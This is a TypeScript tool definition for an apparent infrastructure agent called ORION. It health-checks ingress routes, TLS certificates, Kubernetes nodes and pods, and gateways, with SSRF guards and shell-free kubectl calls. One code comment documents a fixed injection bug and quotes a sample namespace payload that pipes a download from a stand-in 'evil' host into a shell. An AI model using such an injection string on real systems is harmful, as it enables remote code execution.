/**
 * Cluster health check: ingress reachability, TLS expiry and gateway reachability.
 *
 * Tool definitions only — registered (in the canonical order) by ./index.ts.
 */

import { z } from 'zod'
import tls from 'tls'
import https from 'https'
import http from 'http'
import { writeFileSync, unlinkSync, mkdtempSync, rmdirSync } from 'fs'
import { tmpdir } from 'os'
import { join } from 'path'
import { isPrivateUrl } from '@/lib/ssrf-guard'
import { parseToolArgs } from './shared'
import type { ToolDefinition, ToolExecutionContext } from './registry'

// ── Cluster health handler ────────────────────────────────────────────────────

interface IngressEntry { namespace: string; ingress: string; host: string }
interface HealthResult extends IngressEntry {
  status: 'healthy' | 'degraded'
  httpStatus: number
  sslValid: boolean
  sslDaysUntilExpiry: number
  issues: string[]
  taskKey: string
}

async function checkSSLCert(hostname: string): Promise<{ valid: boolean; daysUntilExpiry: number; error?: string }> {
  // SSRF guard: block TLS probes to private/internal addresses. An agent that can
  // write IngressRoute hostnames could otherwise use checkSSLCert to probe internal
  // services on port 443 (e.g. cluster API server, internal dashboards).
  if (await isPrivateUrl(`https://${hostname}`)) {
    return { valid: false, daysUntilExpiry: 0, error: 'SSRF: private/internal addresses are not permitted' }
  }
  return new Promise((resolve) => {
    const socket = tls.connect(443, hostname, { servername: hostname }, () => {
      const cert = socket.getPeerCertificate()
      if (!cert?.valid_to) {
        socket.destroy()
        return resolve({ valid: false, daysUntilExpiry: 0, error: 'no certificate returned' })
      }
      const daysUntilExpiry = Math.floor((new Date(cert.valid_to).getTime() - Date.now()) / 86_400_000)
      socket.destroy()
      resolve({ valid: true, daysUntilExpiry })
    })
    socket.setTimeout(6_000, () => { socket.destroy(); resolve({ valid: false, daysUntilExpiry: 0, error: 'timeout' }) })
    socket.on('error', (e: NodeJS.ErrnoException) => {
      const msg = e.code === 'CERT_HAS_EXPIRED'             ? 'certificate expired'
                : e.code === 'DEPTH_ZERO_SELF_SIGNED_CERT'  ? 'self-signed certificate'
                : e.code === 'ERR_TLS_CERT_ALTNAME_INVALID' ? 'hostname mismatch'
                : e.message
      resolve({ valid: false, daysUntilExpiry: 0, error: msg })
    })
  })
}

async function checkHTTPReachability(hostname: string): Promise<{ statusCode: number; reachable: boolean; error?: string }> {
  // SSRF guard: block requests to private/internal IP ranges. Agents that can write
  // IngressRoute hostnames could otherwise redirect health checks to internal services.
  const url = `https://${hostname}`
  if (await isPrivateUrl(url)) {
    return { statusCode: 0, reachable: false, error: 'SSRF blocked: hostname resolves to a private/internal address' }
  }
  return new Promise((resolve) => {
    const req = https.get(
      url,
      { timeout: 8_000, headers: { 'User-Agent': 'ORION-HealthCheck/1.0' } },
      (res) => {
        const statusCode = res.statusCode ?? 0
        resolve({ statusCode, reachable: statusCode > 0 && statusCode < 500 })
        res.destroy()
      },
    )
    req.on('timeout', () => { req.destroy(); resolve({ statusCode: 0, reachable: false, error: 'timeout' }) })
    req.on('error', (e: NodeJS.ErrnoException) => {
      const isCertError = !!(e.code?.startsWith('CERT_') || e.code?.startsWith('ERR_TLS') || e.code === 'DEPTH_ZERO_SELF_SIGNED_CERT')
      resolve({ statusCode: 0, reachable: isCertError, error: e.message })
    })
  })
}

async function checkGatewayReachability(rawUrl: string): Promise<{ reachable: boolean; statusCode: number; error?: string }> {
  // SSRF guard: block requests to private/internal IP ranges. Agents that can write
  // environment.gatewayUrl or system.service.* settings could pivot to internal hosts.
  if (await isPrivateUrl(rawUrl)) {
    return { reachable: false, statusCode: 0, error: 'SSRF blocked: URL resolves to a private/internal address' }
  }
  return new Promise((resolve) => {
    let parsed: URL
    try { parsed = new URL(rawUrl) }
    catch { return resolve({ reachable: false, statusCode: 0, error: 'invalid URL' }) }

    const requester = parsed.protocol === 'https:' ? https : http
    const req = requester.get(rawUrl, { timeout: 8_000 }, (res) => {
      res.resume()
      resolve({ reachable: true, statusCode: res.statusCode ?? 0 })
    })
    req.on('timeout', () => { req.destroy(); resolve({ reachable: false, statusCode: 0, error: 'timeout' }) })
    req.on('error',   (e) => resolve({ reachable: false, statusCode: 0, error: e.message }))
  })
}

const ClusterHealthArgs = z.object({
  namespace: z.string().nullish(),
})

async function handleClusterHealth(args: unknown, ctx: ToolExecutionContext): Promise<string> {
  const { namespace } = parseToolArgs(ClusterHealthArgs, args)

  const clusterIssues: HealthResult[] = []
  const errors: string[] = []

  const ingressRoutes = await ctx.prisma.ingressRoute.findMany({
    where:  { enabled: true },
    select: { host: true, tls: true, ingressPoint: { select: { name: true, domain: { select: { name: true } } } } },
  })

  const seenHosts = new Set<string>()
  const uniqueRoutes = ingressRoutes.filter((r) => {
    if (seenHosts.has(r.host)) return false
    seenHosts.add(r.host)
    return true
  })

  const envs = await ctx.prisma.environment.findMany({
    where:  { type: 'cluster', kubeconfig: { not: null } },
    select: { id: true, name: true, kubeconfig: true },
  })

  for (const env of envs) {
    let kubeconfigPath: string | null = null
    let kubeconfigTmpDir: string | null = null
    try {
      const decoded = Buffer.from(env.kubeconfig!, 'base64').toString('utf-8')
      kubeconfigTmpDir = mkdtempSync(join(tmpdir(), 'orion-health-'))
      kubeconfigPath = join(kubeconfigTmpDir, 'kubeconfig.yaml')
      writeFileSync(kubeconfigPath, decoded, { flag: 'wx', mode: 0o600 })
      // BLOCKER fix: `namespace` arg was interpolated into exec() template string → shell injection.
      // A namespace value like `; curl http://evil | sh #` ran arbitrary commands.
      // Switch to execFile (no shell) with args as an array.
      const { execFile: execFileCb } = await import('child_process')
      const execFileAsync = (cmd: string, args: string[], opts: { timeout: number }) =>
        new Promise<{ stdout: string }>((res, rej) =>
          execFileCb(cmd, args, { ...opts, encoding: 'utf8' }, (err, stdout) =>
            err ? rej(err) : res({ stdout: stdout as string })
          )
        )
      // Validate namespace is a safe K8s label (DNS subdomain + dots)
      const safeNs = namespace && /^[a-z0-9][a-z0-9.-]{0,251}[a-z0-9]$/.test(namespace) ? namespace : null
      const baseArgs = ['--kubeconfig', kubeconfigPath!, '-o', 'json']
      const nsArgs   = safeNs ? ['-n', safeNs] : ['-A']

      const [nodesOut, podsOut] = await Promise.all([
        execFileAsync('kubectl', ['get', 'nodes', ...baseArgs],         { timeout: 15_000 }).catch(() => null),
        execFileAsync('kubectl', ['get', 'pods', ...nsArgs, ...baseArgs], { timeout: 20_000 }).catch(() => null),
      ])

      if (nodesOut) {
        const nodesData = JSON.parse(nodesOut.stdout) as { items: any[] }
        for (const node of nodesData.items) {
          const readyCond = node.status?.conditions?.find((c: any) => c.type === 'Ready')
          if (readyCond?.status !== 'True') {
            const reason = readyCond?.reason ?? readyCond?.message ?? 'Unknown'
            clusterIssues.push({
              namespace:          env.name,
              ingress:            'node',
              host:               `node/${node.metadata.name as string}`,
              status:             'degraded',
              httpStatus:         0,
              sslValid:           true,
              sslDaysUntilExpiry: 999,
              issues:             [`node NotReady — ${reason}`],
              taskKey:            `pulse:node:${node.metadata.name as string}`,
            })
          }
        }
      }

      if (podsOut) {
        const podsData = JSON.parse(podsOut.stdout) as { items: any[] }
        for (const pod of podsData.items) {
          const phase = pod.status?.phase as string | undefined
          if (phase === 'Succeeded') continue
          const podIssues: string[] = []
          if (phase === 'Pending') {
            const condition = pod.status?.conditions?.find((c: any) => c.type === 'PodScheduled' && c.status !== 'True')
            podIssues.push(`Pending${condition ? ` — ${condition.reason as string}` : ''}`)
          } else if (phase === 'Failed') {
            podIssues.push(`Failed — ${pod.status?.reason ?? pod.status?.message ?? 'unknown'}`)
          } else if (phase === 'Running' || !phase) {
            for (const cs of (pod.status?.containerStatuses ?? []) as any[]) {
              const waiting = cs.state?.waiting
              if (waiting?.reason === 'CrashLoopBackOff') {
                podIssues.push(`CrashLoopBackOff — ${cs.name as string} (${cs.restartCount as number} restarts)`)
              } else if (waiting?.reason === 'OOMKilled' || cs.lastState?.terminated?.reason === 'OOMKilled') {
                podIssues.push(`OOMKilled — ${cs.name as string}`)
              } else if (!cs.ready && !waiting?.reason) {
                podIssues.push(`container not ready — ${cs.name as string}`)
              }
            }
          }
          if (podIssues.length > 0) {
            clusterIssues.push({
              namespace:          `${env.name}/${pod.metadata.namespace as string}`,
              ingress:            'pod',
              host:               `pod/${pod.metadata.name as string}`,
              status:             'degraded',
              httpStatus:         0,
              sslValid:           true,
              sslDaysUntilExpiry: 999,
              issues:             podIssues,
              taskKey:            `pulse:pod:${pod.metadata.namespace as string}/${pod.metadata.name as string}`,
            })
          }
        }
      }
    } catch (e) {
      errors.push(`${env.name}: ${e instanceof Error ? e.message : String(e)}`)
    } finally {
      if (kubeconfigPath) try { unlinkSync(kubeconfigPath) } catch { /* ignore */ }
      if (kubeconfigTmpDir) try { rmdirSync(kubeconfigTmpDir) } catch { /* ignore */ }
    }
  }

  const results: HealthResult[] = await Promise.all(
    uniqueRoutes.map(async (route) => {
      const label = route.ingressPoint?.domain?.name ?? route.ingressPoint?.name ?? 'ingress'
      const [httpCheck, ssl] = await Promise.all([
        checkHTTPReachability(route.host),
        route.tls ? checkSSLCert(route.host) : Promise.resolve({ valid: true, daysUntilExpiry: 999 }),
      ])

      const issues: string[] = []
      if (!httpCheck.reachable)           issues.push(`unreachable — ${httpCheck.error ?? `HTTP ${httpCheck.statusCode}`}`)
      if (route.tls) {
        if (!ssl.valid)                     issues.push(`invalid SSL cert — ${(ssl as any).error ?? 'certificate not trusted'}`)
        else if (ssl.daysUntilExpiry <= 0)  issues.push('SSL cert expired')
        else if (ssl.daysUntilExpiry < 30)  issues.push(`SSL cert expires in ${ssl.daysUntilExpiry} days`)
      }

      return {
        namespace:          label,
        ingress:            route.ingressPoint?.name ?? 'unknown',
        host:               route.host,
        status:             issues.length === 0 ? 'healthy' : 'degraded',
        httpStatus:         httpCheck.statusCode,
        sslValid:           ssl.valid,
        sslDaysUntilExpiry: ssl.daysUntilExpiry,
        issues,
        taskKey:            `pulse:host:${route.host}`,
      } as HealthResult
    })
  )

  results.push(...clusterIssues)

  const allEnvsWithGateway = await ctx.prisma.environment.findMany({
    where:  { gatewayUrl: { not: null } },
    select: { id: true, name: true, type: true, gatewayUrl: true },
  })

  for (const env of allEnvsWithGateway) {
    try {
      const reach = await checkGatewayReachability(env.gatewayUrl!)
      const issues: string[] = []
      if (!reach.reachable) issues.push(`gateway unreachable — ${reach.error ?? `HTTP ${reach.statusCode}`}`)
      results.push({
        namespace:          `gateway/${env.type}`,
        ingress:            env.name,
        host:               env.gatewayUrl!,
        status:             issues.length === 0 ? 'healthy' : 'degraded',
        httpStatus:         reach.statusCode,
        sslValid:           true,
        sslDaysUntilExpiry: 999,
        issues,
        taskKey:            `pulse:gateway:${env.name.toLowerCase().replace(/\s+/g, '-')}`,
      } as HealthResult)
    } catch (e) {
      errors.push(`${env.name} gateway: ${e instanceof Error ? e.message : String(e)}`)
    }
  }

  const systemServiceSettings = await ctx.prisma.systemSetting.findMany({
    where: { key: { startsWith: 'system.service.' } },
  })
  for (const setting of systemServiceSettings) {
    const url = typeof setting.value === 'string' ? setting.value : null
    if (!url) continue
    const label = setting.key.replace('system.service.', '')
    try {
      const reach = await checkGatewayReachability(url)
      const issues: string[] = []
      if (!reach.reachable) issues.push(`unreachable — ${reach.error ?? `HTTP ${reach.statusCode}`}`)
      results.push({
        namespace:          'orion-system',
        ingress:            label,
        host:               url,
        status:             issues.length === 0 ? 'healthy' : 'degraded',
        httpStatus:         reach.statusCode,
        sslValid:           true,
        sslDaysUntilExpiry: 999,
        issues,
        taskKey:            `pulse:svc:${label}`,
      } as HealthResult)
    } catch (e) {
      errors.push(`${label}: ${e instanceof Error ? e.message : String(e)}`)
    }
  }

  const degraded = results.filter((r) => r.status === 'degraded')
  return JSON.stringify({
    summary: { total: results.length, healthy: results.length - degraded.length, degraded: degraded.length },
    degraded,
    all: results,
    ...(errors.length > 0 && { errors }),
  }, null, 2)
}

export const orionClusterHealthTool: ToolDefinition = {
  name: 'orion_cluster_health',
  description: 'Comprehensive health check across all ORION-managed systems: (1) all enabled IngressRoutes — HTTP reachability and SSL cert validity; (2) Kubernetes cluster node readiness and pod issues (CrashLoopBackOff, OOMKilled, Failed, Pending); (3) all registered environment gateways; (4) ORION system services (Gitea, Vault, ORION itself). Each degraded item includes a canonical taskKey field — pass this as dedup_key when calling orion_create_task to prevent duplicate fix tasks.',
  inputSchema: {
    type: 'object',
    properties: {
      namespace: { type: 'string', description: 'Limit check to a specific namespace (optional — omit to check all namespaces)' },
    },
  },
  tier: 'read',
  parallelSafe: true,
  availableIn: 'both',
  category: 'environment',
  handler: handleClusterHealth,
}
